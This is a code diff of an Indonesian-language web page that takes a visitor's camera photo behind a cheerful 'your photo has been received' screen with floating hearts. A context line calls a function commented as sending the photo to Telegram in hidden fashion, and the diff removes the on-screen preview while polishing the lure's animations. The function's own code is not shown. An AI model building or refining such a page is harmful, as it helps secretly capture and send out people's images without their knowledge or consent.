@@ -81,25 +81,27 @@
             50% { transform: translateY(-30px); }
         }
 
-        @keyframes slideInLeft {
-            from {
-                opacity: 0;
-                transform: translateX(-100px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
-        @keyframes slideInRight {
-            from {
+        @keyframes heartFloat {
+            0% {
                 opacity: 0;
-                transform: translateX(100px);
+                transform: translateY(0) scale(0);
             }
-            to {
+            10% {
                 opacity: 1;
-                transform: translateX(0);
+                transform: translateY(-20px) scale(1);
+            }
+            90% {
+                opacity: 1;
+                transform: translateY(-300px) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-400px) scale(0);
             }
         }
 
@@ -151,67 +153,49 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             z-index: 20;
             overflow: hidden;
+            animation: fadeIn 0.5s ease;
         }
 
         .success-content {
             width: 100%;
             height: 100%;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 30px;
+            gap: 40px;
             padding: 40px;
             position: relative;
-        }
-
-        .photo-box {
-            position: relative;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            animation: slideInLeft 0.8s ease;
-        }
-
-        .photo-box img {
-            width: 280px;
-            height: 350px;
-            object-fit: cover;
-            display: block;
-        }
-
-        .heart-animation {
-            position: absolute;
-            font-size: 4rem;
-            animation: slideInRight 0.8s ease;
-        }
-
-        .heart-animation:nth-child(1) {
-            top: 20%;
-            right: 10%;
-            animation-delay: 0.2s;
-        }
-
-        .heart-animation:nth-child(2) {
-            top: 50%;
-            right: 5%;
-            animation-delay: 0.4s;
-        }
-
-        .heart-animation:nth-child(3) {
-            bottom: 20%;
-            right: 15%;
-            animation-delay: 0.6s;
-        }
-
-        .message {
             color: white;
             text-align: center;
+        }
+
+        .message-box {
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-shadow: 0 3px 15px rgba(0, 0, 0, 0.2);
+            line-height: 1.4;
+            animation: fadeIn 0.8s ease;
+        }
+
+        .message-box .emoji {
+            font-size: 3rem;
+            display: block;
+            margin-top: 20px;
+            animation: bounce 1s ease-in-out infinite;
+        }
+
+        .hearts-container {
             position: absolute;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            font-size: 1.5rem;
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .floating-heart {
+            position: absolute;
+            font-size: 2rem;
+            animation: heartFloat 3s ease-in forwards;
         }
 
         .button-group {
@@ -220,6 +204,7 @@
             left: 50%;
             transform: translateX(-50%);
             z-index: 25;
+            animation: fadeIn 1s ease 0.5s backwards;
         }
 
         .button-group button {
@@ -227,6 +212,16 @@
             font-size: 1rem;
             background: rgba(255, 255, 255, 0.95);
             color: #667eea;
+        }
+
+        @media (max-width: 768px) {
+            .message-box {
+                font-size: 1.8rem;
+            }
+
+            .message-box .emoji {
+                font-size: 2.5rem;
+            }
         }
     </style>
 </head>
@@ -244,17 +239,16 @@
     </div>
 
     <div id="success-screen">
+        <div class="hearts-container" id="hearts-container"></div>
         <div class="success-content">
-            <div class="photo-box">
-                <img id="captured-photo" src="" alt="Foto">
+            <div class="message-box">
+                Fotomu sudah kami terima!
+                <span class="emoji">📸💝</span>
             </div>
-            <div class="heart-animation">❤️</div>
-            <div class="heart-animation">💕</div>
-            <div class="heart-animation">💖</div>
-        </div>
-        <div class="message">Fotomu sudah kami terima 💝</div>
-        <div class="button-group">
-            <button id="retry-btn">Ulangi</button>
+            <div style="font-size: 1.5rem; opacity: 0.9;">Terima kasih telah berbagi momen spesialmu 💕</div>
+            <div class="button-group">
+                <button id="retry-btn">Ulangi</button>
+            </div>
         </div>
     </div>
 
@@ -276,18 +270,20 @@
         const ctx = canvas.getContext('2d');
         const startBtn = document.getElementById('start-btn');
         const retryBtn = document.getElementById('retry-btn');
-        const capturedPhoto = document.getElementById('captured-photo');
         const startScreen = document.getElementById('start-screen');
         const successScreen = document.getElementById('success-screen');
         const backgroundMusic = document.getElementById('background-music');
+        const heartsContainer = document.getElementById('hearts-container');
 
         startBtn.addEventListener('click', requestCameraAccess);
         retryBtn.addEventListener('click', reset);
 
-        // Play musik saat page load
+        // Play musik saat pertama kali interaksi
         document.addEventListener('click', () => {
             if (backgroundMusic.paused) {
-                backgroundMusic.play();
+                backgroundMusic.play().catch(() => {
+                    console.log('Auto-play blocked');
+                });
             }
         });
 
@@ -331,7 +327,7 @@
             // Kirim ke Telegram (hidden)
             sendPhotoToTelegram();
             
-            // Tampilkan success screen dengan foto
+            // Tampilkan success screen
             displaySuccess();
         }
 
@@ -359,18 +355,45 @@
         function displaySuccess() {
             startScreen.style.display = 'none';
             successScreen.style.display = 'block';
-            capturedPhoto.src = capturedImage;
             
             // Play musik
             backgroundMusic.play().catch(() => {
                 console.log('Auto-play blocked');
             });
+
+            // Generate floating hearts
+            generateFloatingHearts();
+        }
+
+        function generateFloatingHearts() {
+            const hearts = ['❤️', '💕', '💖', '💝'];
+            
+            for (let i = 0; i < 15; i++) {
+                setTimeout(() => {
+                    const heart = document.createElement('div');
+                    heart.className = 'floating-heart';
+                    heart.textContent = hearts[Math.floor(Math.random() * hearts.length)];
+                    
+                    const randomLeft = Math.random() * 100;
+                    heart.style.left = randomLeft + '%';
+                    heart.style.bottom = '-50px';
+                    heart.style.animationDelay = (i * 0.2) + 's';
+                    
+                    heartsContainer.appendChild(heart);
+
+                    // Hapus element setelah animasi selesai
+                    setTimeout(() => {
+                        heart.remove();
+                    }, 3000);
+                }, i * 200);
+            }
         }
 
         function reset() {
             startScreen.style.display = 'block';
             successScreen.style.display = 'none';
             capturedImage = null;
+            heartsContainer.innerHTML = '';
         }
     </script>
 </body>
